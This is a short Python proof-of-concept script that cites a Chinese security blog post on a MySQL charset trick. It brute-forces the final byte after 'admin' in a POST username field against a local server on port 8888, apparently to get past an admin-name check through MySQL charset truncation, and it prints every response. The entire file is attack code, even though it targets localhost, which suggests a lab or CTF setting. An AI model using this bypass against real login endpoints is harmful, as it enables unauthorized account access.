# https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html

#!/usr/bin python

import requests

url = "http://localhost:8888"

user = bytearray(b"admin?")
for i in range(0x100):
    user[-1] = i
    data = {"user": bytes(user)}
    r = requests.post(url, data)

    print(r.text)
